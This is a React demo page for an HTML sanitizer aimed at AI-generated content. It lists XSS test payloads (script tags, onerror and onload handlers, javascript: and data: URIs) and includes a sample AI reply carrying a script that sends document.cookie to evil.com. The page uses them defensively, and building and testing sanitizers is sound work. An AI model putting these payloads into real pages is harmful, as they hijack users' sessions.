"use client"

import { useState, useMemo } from "react"
import { motion } from "motion/react"
import {
  sanitizeHTML,
  LiveSanitizePreview,
  ThreatMeter,
  SanitizationReport,
  DEFAULT_ALLOWED_TAGS,
} from "../components/sanitizer"

// ============================================================================
// EXAMPLE PAYLOADS
// ============================================================================

const EXAMPLE_PAYLOADS = [
  {
    name: "Script Injection",
    severity: "critical",
    payload: `<p>Hello!</p><script>alert('XSS')</script><p>World</p>`,
  },
  {
    name: "Event Handler",
    severity: "critical",
    payload: `<img src="x" onerror="alert('XSS')"><p>Malicious image</p>`,
  },
  {
    name: "JavaScript URI",
    severity: "critical",
    payload: `<a href="javascript:alert('XSS')">Click me</a>`,
  },
  {
    name: "SVG with Script",
    severity: "high",
    payload: `<svg onload="alert('XSS')"><circle r="50"/></svg>`,
  },
  {
    name: "Data URI Injection",
    severity: "high",
    payload: `<img src="data:text/html,<script>alert('XSS')</script>">`,
  },
  {
    name: "Style Injection",
    severity: "medium",
    payload: `<style>body{background:url('javascript:alert(1)')}</style><p>Styled</p>`,
  },
  {
    name: "Safe Content",
    severity: "none",
    payload: `<h1>Welcome</h1><p>This is <strong>safe</strong> content with a <a href="https://example.com">link</a>.</p>`,
  },
]

// ============================================================================
// MAIN PAGE
// ============================================================================

export default function OutputSanitizerDemo() {
  const [input, setInput] = useState(EXAMPLE_PAYLOADS[0].payload)
  const [showRealWorld, setShowRealWorld] = useState(false)

  const result = useMemo(() => sanitizeHTML(input), [input])

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="border-b border-border/50 bg-background/80 backdrop-blur-sm sticky top-0 z-10">
        <div className="mx-auto max-w-6xl px-4">
          <div className="flex h-14 items-center justify-between">
            <div>
              <h1 className="text-sm font-semibold">Output Sanitizer</h1>
              <p className="text-xs text-muted-foreground">
                XSS prevention for AI-generated content
              </p>
            </div>

            <div className="flex items-center gap-3">
              <ThreatMeter threats={result.threats} />

              <button
                onClick={() => setShowRealWorld(!showRealWorld)}
                className={`rounded-lg px-3 py-1.5 text-xs font-medium transition-colors ${
                  showRealWorld
                    ? "bg-primary text-primary-foreground"
                    : "bg-muted text-muted-foreground hover:text-foreground"
                }`}
              >
                {showRealWorld ? "Hide Examples" : "Real-World Examples"}
              </button>
            </div>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-6xl px-4 py-8">
        {showRealWorld ? (
          <RealWorldExamples />
        ) : (
          <div className="grid gap-8 lg:grid-cols-2">
            {/* Input */}
            <div>
              <div className="mb-4 flex items-center justify-between">
                <h2 className="text-sm font-semibold">Input (Potentially Malicious)</h2>
                <span className="text-xs text-muted-foreground">
                  Paste or type HTML content
                </span>
              </div>

              <textarea
                value={input}
                onChange={(e) => setInput(e.target.value)}
                placeholder="Enter HTML content to sanitize..."
                className="h-64 w-full rounded-xl border border-input bg-background p-4 text-sm font-mono outline-none placeholder:text-muted-foreground/50 focus-visible:ring-2 focus-visible:ring-ring"
              />

              {/* Quick payloads */}
              <div className="mt-4">
                <p className="mb-2 text-xs font-medium text-muted-foreground">
                  Test Payloads
                </p>
                <div className="flex flex-wrap gap-2">
                  {EXAMPLE_PAYLOADS.map((example) => (
                    <button
                      key={example.name}
                      onClick={() => setInput(example.payload)}
                      className={`rounded-lg px-3 py-1.5 text-xs font-medium transition-colors ${
                        input === example.payload
                          ? "bg-primary text-primary-foreground"
                          : "bg-muted hover:bg-muted/80"
                      }`}
                    >
                      <span
                        className={`mr-1.5 inline-block size-1.5 rounded-full ${
                          example.severity === "critical"
                            ? "bg-red-500"
                            : example.severity === "high"
                            ? "bg-orange-500"
                            : example.severity === "medium"
                            ? "bg-yellow-500"
                            : "bg-emerald-500"
                        }`}
                      />
                      {example.name}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            {/* Output */}
            <div>
              <div className="mb-4">
                <h2 className="text-sm font-semibold">Sanitized Output</h2>
              </div>

              <LiveSanitizePreview input={input} />
            </div>
          </div>
        )}

        {/* Code example */}
        <div className="mt-12">
          <h2 className="mb-4 text-lg font-semibold">Integration</h2>

          <div className="grid gap-6 lg:grid-cols-2">
            <CodeBlock
              title="React Component"
              code={`import { SanitizedContent } from './sanitizer'

// Safe rendering of AI output
export function ChatMessage({ content }) {
  return (
    <SanitizedContent
      content={content}
      showReport={true}
      config={{
        allowedTags: ['p', 'strong', 'em', 'a', 'code'],
        allowedSchemes: ['https'],
      }}
    />
  )
}`}
            />

            <CodeBlock
              title="Hook Usage"
              code={`import { useSanitizedOutput } from './sanitizer'

export function AIChat() {
  const { sanitize, lastResult } = useSanitizedOutput({
    onThreatDetected: (threats) => {
      console.warn('Threats detected:', threats)
      // Send to security monitoring
    },
  })

  const handleMessage = (aiResponse: string) => {
    const safeContent = sanitize(aiResponse)
    // Render safeContent
  }
}`}
            />
          </div>
        </div>

        {/* Features */}
        <div className="mt-12">
          <h2 className="mb-4 text-lg font-semibold">Security Features</h2>

          <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
            <FeatureCard
              icon={<ScriptIcon />}
              title="Script Removal"
              description="Strips all <script> tags and inline JavaScript"
            />
            <FeatureCard
              icon={<EventIcon />}
              title="Event Handler Blocking"
              description="Removes onclick, onerror, onload, etc."
            />
            <FeatureCard
              icon={<LinkIcon />}
              title="URL Validation"
              description="Blocks javascript: and suspicious data: URIs"
            />
            <FeatureCard
              icon={<StyleIcon />}
              title="Style Sanitization"
              description="Removes CSS expressions and style tags"
            />
            <FeatureCard
              icon={<SvgIcon />}
              title="SVG Protection"
              description="Strips SVG elements that can contain scripts"
            />
            <FeatureCard
              icon={<ReportIcon />}
              title="Threat Reporting"
              description="Detailed reports of detected and removed threats"
            />
          </div>
        </div>

        {/* Allowed tags */}
        <div className="mt-12">
          <h2 className="mb-4 text-lg font-semibold">Allowed Tags (Default)</h2>
          <div className="flex flex-wrap gap-2">
            {DEFAULT_ALLOWED_TAGS.map((tag) => (
              <span
                key={tag}
                className="rounded-lg bg-muted px-2.5 py-1 text-xs font-mono"
              >
                &lt;{tag}&gt;
              </span>
            ))}
          </div>
        </div>
      </main>
    </div>
  )
}

// ============================================================================
// REAL WORLD EXAMPLES
// ============================================================================

function RealWorldExamples() {
  const examples = [
    {
      title: "AI Chatbot Response with Malicious Injection",
      description: "A user tricks the AI into generating XSS payloads",
      before: `Here's a helpful HTML example:
<p>Welcome to our site!</p>
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
<p>Hope this helps!</p>`,
      explanation:
        "The AI was tricked into including a cookie-stealing script. Our sanitizer removes it completely.",
    },
    {
      title: "Markdown-to-HTML Conversion Attack",
      description: "Malicious markdown that converts to dangerous HTML",
      before: `# Hello World

Check out this [cool link](javascript:alert('XSS'))!

And here's an image: ![alt](x" onerror="alert('XSS'))`,
      explanation:
        "Markdown converters can be exploited. We sanitize javascript: URIs and remove event handlers.",
    },
    {
      title: "AI-Generated Code Block Escape",
      description: "Breaking out of code blocks to inject scripts",
      before: `Here's how to center a div:
\`\`\`html
<div style="text-align: center;">Centered</div>
\`\`\`
</code></pre><script>alert('Escaped!')</script><pre><code>`,
      explanation:
        "Attackers try to close code blocks and inject scripts. Our sanitizer catches this.",
    },
  ]

  return (
    <div className="space-y-8">
      <div className="text-center">
        <h2 className="text-lg font-semibold">Real-World Attack Scenarios</h2>
        <p className="mt-1 text-sm text-muted-foreground">
          See how the sanitizer protects against documented vulnerabilities
        </p>
      </div>

      {examples.map((example, i) => {
        const result = sanitizeHTML(example.before)

        return (
          <motion.div
            key={i}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: i * 0.1 }}
            className="rounded-xl border border-border/50 overflow-hidden"
          >
            <div className="border-b border-border/50 bg-muted/30 px-4 py-3">
              <h3 className="text-sm font-semibold">{example.title}</h3>
              <p className="text-xs text-muted-foreground">{example.description}</p>
            </div>

            <div className="grid lg:grid-cols-2">
              {/* Before */}
              <div className="border-b border-border/50 p-4 lg:border-b-0 lg:border-r">
                <div className="mb-2 flex items-center gap-2">
                  <span className="rounded bg-red-500/10 px-2 py-0.5 text-xs font-semibold text-red-500">
                    UNSAFE
                  </span>
                  <span className="text-xs text-muted-foreground">
                    Original AI Output
                  </span>
                </div>
                <pre className="overflow-x-auto rounded-lg bg-zinc-950 p-3 text-xs text-zinc-100">
                  <code>{example.before}</code>
                </pre>
              </div>

              {/* After */}
              <div className="p-4">
                <div className="mb-2 flex items-center gap-2">
                  <span className="rounded bg-emerald-500/10 px-2 py-0.5 text-xs font-semibold text-emerald-500">
                    SAFE
                  </span>
                  <span className="text-xs text-muted-foreground">
                    After Sanitization
                  </span>
                </div>
                <div
                  dangerouslySetInnerHTML={{ __html: result.clean || "<em>Empty</em>" }}
                  className="prose prose-sm dark:prose-invert max-w-none rounded-lg bg-card p-3 border border-border/50 min-h-[80px]"
                />
              </div>
            </div>

            {/* Report */}
            <div className="border-t border-border/50 bg-muted/20 px-4 py-3">
              <div className="flex items-start gap-3">
                <div className="flex-1">
                  <SanitizationReport result={result} expanded />
                </div>
                <div className="shrink-0 max-w-xs">
                  <p className="text-xs text-muted-foreground">
                    {example.explanation}
                  </p>
                </div>
              </div>
            </div>
          </motion.div>
        )
      })}
    </div>
  )
}

// ============================================================================
// HELPER COMPONENTS
// ============================================================================

function CodeBlock({ title, code }: { title: string; code: string }) {
  return (
    <div className="rounded-xl border border-border/50 overflow-hidden">
      <div className="border-b border-border/50 bg-muted/30 px-4 py-2">
        <p className="text-xs font-medium">{title}</p>
      </div>
      <pre className="overflow-x-auto bg-zinc-950 p-4 text-xs text-zinc-100">
        <code>{code}</code>
      </pre>
    </div>
  )
}

function FeatureCard({
  icon,
  title,
  description,
}: {
  icon: React.ReactNode
  title: string
  description: string
}) {
  return (
    <div className="rounded-xl border border-border/50 bg-card p-4">
      <div className="flex items-center gap-3">
        <div className="flex size-10 items-center justify-center rounded-lg bg-primary/10 text-primary">
          {icon}
        </div>
        <div>
          <h3 className="text-sm font-semibold">{title}</h3>
          <p className="text-xs text-muted-foreground">{description}</p>
        </div>
      </div>
    </div>
  )
}

// ============================================================================
// ICONS
// ============================================================================

function ScriptIcon() {
  return (
    <svg className="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
      <path strokeLinecap="round" strokeLinejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
    </svg>
  )
}

function EventIcon() {
  return (
    <svg className="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
      <path strokeLinecap="round" strokeLinejoin="round" d="M15.042 21.672 13.684 16.6m0 0-2.51 2.225.569-9.47 5.227 7.917-3.286-.672Zm-7.518-.267A8.25 8.25 0 1 1 20.25 10.5M8.288 14.212A5.25 5.25 0 1 1 17.25 10.5" />
    </svg>
  )
}

function LinkIcon() {
  return (
    <svg className="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
      <path strokeLinecap="round" strokeLinejoin="round" d="M13.19 8.688a4.5 4.5 0 0 1 1.242 7.244l-4.5 4.5a4.5 4.5 0 0 1-6.364-6.364l1.757-1.757m13.35-.622 1.757-1.757a4.5 4.5 0 0 0-6.364-6.364l-4.5 4.5a4.5 4.5 0 0 0 1.242 7.244" />
    </svg>
  )
}

function StyleIcon() {
  return (
    <svg className="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
      <path strokeLinecap="round" strokeLinejoin="round" d="M9.53 16.122a3 3 0 0 0-5.78 1.128 2.25 2.25 0 0 1-2.4 2.245 4.5 4.5 0 0 0 8.4-2.245c0-.399-.078-.78-.22-1.128Zm0 0a15.998 15.998 0 0 0 3.388-1.62m-5.043-.025a15.994 15.994 0 0 1 1.622-3.395m3.42 3.42a15.995 15.995 0 0 0 4.764-4.648l3.876-5.814a1.151 1.151 0 0 0-1.597-1.597L14.146 6.32a15.996 15.996 0 0 0-4.649 4.763m3.42 3.42a6.776 6.776 0 0 0-3.42-3.42" />
    </svg>
  )
}

function SvgIcon() {
  return (
    <svg className="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
      <path strokeLinecap="round" strokeLinejoin="round" d="m21 7.5-2.25-1.313M21 7.5v2.25m0-2.25-2.25 1.313M3 7.5l2.25-1.313M3 7.5l2.25 1.313M3 7.5v2.25m9 3 2.25-1.313M12 12.75l-2.25-1.313M12 12.75V15m0 6.75 2.25-1.313M12 21.75V19.5m0 2.25-2.25-1.313m0-16.875L12 2.25l2.25 1.313M21 14.25v2.25l-2.25 1.313m-13.5 0L3 16.5v-2.25" />
    </svg>
  )
}

function ReportIcon() {
  return (
    <svg className="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
      <path strokeLinecap="round" strokeLinejoin="round" d="M9 12h3.75M9 15h3.75M9 18h3.75m3 .75H18a2.25 2.25 0 0 0 2.25-2.25V6.108c0-1.135-.845-2.098-1.976-2.192a48.424 48.424 0 0 0-1.123-.08m-5.801 0c-.065.21-.1.433-.1.664 0 .414.336.75.75.75h4.5a.75.75 0 0 0 .75-.75 2.25 2.25 0 0 0-.1-.664m-5.8 0A2.251 2.251 0 0 1 13.5 2.25H15c1.012 0 1.867.668 2.15 1.586m-5.8 0c-.376.023-.75.05-1.124.08C9.095 4.01 8.25 4.973 8.25 6.108V8.25m0 0H4.875c-.621 0-1.125.504-1.125 1.125v11.25c0 .621.504 1.125 1.125 1.125h9.75c.621 0 1.125-.504 1.125-1.125V9.375c0-.621-.504-1.125-1.125-1.125H8.25ZM6.75 12h.008v.008H6.75V12Zm0 3h.008v.008H6.75V15Zm0 3h.008v.008H6.75V18Z" />
    </svg>
  )
}
